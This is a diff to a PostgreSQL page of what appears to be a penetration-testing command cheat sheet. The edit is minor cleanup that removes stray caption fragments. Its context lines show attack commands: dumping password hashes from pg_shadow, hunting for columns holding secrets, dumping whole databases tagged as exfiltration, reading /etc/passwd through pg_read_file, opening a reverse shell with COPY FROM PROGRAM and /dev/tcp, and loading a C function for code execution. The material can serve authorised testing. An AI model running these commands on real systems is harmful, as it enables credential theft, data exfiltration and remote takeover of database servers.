@@ -3,7 +3,7 @@ id: "dij9te2nfmptlc1di"
 title: "postgresql"
 description: ""
 tags: []
-order: "16"
+order: 16
 createdAt: "2026-05-31T09:42:01.206Z"
 updatedAt: "2026-05-31T09:56:29.452Z"
 ---
@@ -129,8 +129,6 @@ _Enumeration (Authenticated)_
 SELECT current_user, session_user;
 ```
 
-_user, session_
-
 **Tags:** postgresql, enumeration, authenticated
 <!-- cmd: {"id":"pjq5b1bd4mptlukpx","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->
 
@@ -171,8 +169,6 @@ SELECT datname FROM pg_database;
 SELECT schema_name FROM information_schema.schemata;
 ```
 
-_name FROM information_
-
 **Tags:** postgresql, enumeration, authenticated
 <!-- cmd: {"id":"17bf6qahcmptlukql","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->
 
@@ -189,8 +185,6 @@ _name FROM information_
 SELECT table_schema, table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
 ```
 
-_schema, table_
-
 **Tags:** postgresql, enumeration, authenticated
 <!-- cmd: {"id":"p3d102o1xmptlukqv","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->
 
@@ -206,8 +200,6 @@ SELECT usename, passwd FROM pg_shadow;
 ```bash
 SELECT usesuper FROM pg_user WHERE usename=current_user;
 ```
-
-_user WHERE usename=current_
 
 **Tags:** postgresql, enumeration, authenticated
 <!-- cmd: {"id":"5r25myg50mptlukr5","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->
@@ -252,7 +244,7 @@ SHOW data_directory;
 SELECT table_schema, table_name, column_name FROM information_schema.columns
 ```
 
-_schema, table_
+_Data Extraction_
 
 **Tags:** postgresql, datadump, exfiltration
 <!-- cmd: {"id":"pwj7uunz0mptluks4","language":"bash","sectionId":"as0v4jn54mptlukld","tags":["postgresql","datadump","exfiltration"]} -->
@@ -261,8 +253,6 @@ _schema, table_
 ```bash
 WHERE column_name ILIKE '%pass%' OR column_name ILIKE '%secret%' OR column_name ILIKE '%token%' OR column_name ILIKE '%key%';
 ```
-
-_name ILIKE '%pass%' OR column_
 
 **Tags:** postgresql, datadump, exfiltration
 <!-- cmd: {"id":"o6upomdq9mptluks9","language":"bash","sectionId":"as0v4jn54mptlukld","tags":["postgresql","datadump","exfiltration"]} -->
@@ -295,8 +285,6 @@ PGPASSWORD=$PASS pg_dump -h $TARGET -U $USER -d $DATABASE > dump.sql
 ```bash
 PGPASSWORD=$PASS pg_dumpall -h $TARGET -U $USER > all_dbs.sql
 ```
-
-_dumpall -h $TARGET -U $USER > all_
 
 **Tags:** postgresql, datadump, exfiltration
 <!-- cmd: {"id":"8o59o56hdmptluksu","language":"bash","sectionId":"as0v4jn54mptlukld","tags":["postgresql","datadump","exfiltration"]} -->
@@ -343,8 +331,6 @@ DROP TABLE tmp_read;
 SELECT pg_read_file('/etc/passwd');
 ```
 
-_read_
-
 **Tags:** postgresql, fileread, lfi
 <!-- cmd: {"id":"yyyzjn3sxmptluktm","language":"bash","sectionId":"ypxv3bdd4mptluklh","tags":["postgresql","fileread","lfi"]} -->
 
@@ -352,8 +338,6 @@ _read_
 ```bash
 SELECT pg_read_file('/etc/postgresql/14/main/pg_hba.conf');
 ```
-
-_read_
 
 **Tags:** postgresql, fileread, lfi
 <!-- cmd: {"id":"qr824sdb8mptluktr","language":"bash","sectionId":"ypxv3bdd4mptluklh","tags":["postgresql","fileread","lfi"]} -->
@@ -448,7 +432,7 @@ CREATE TABLE s(x text); COPY s FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/$LHOS
 CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int AS '/tmp/pg_exec.so', 'sys_exec' LANGUAGE C STRICT;
 ```
 
-_exec(text) RETURNS int AS '/tmp/pg_
+_RCE via Custom Extension (UDF)_
 
 **Tags:** postgresql, udf, rce, privesc
 <!-- cmd: {"id":"f6wau1m1cmptlukvu","language":"bash","sectionId":"3jdwids50mptluklv","tags":["postgresql","udf","rce","privesc"]} -->
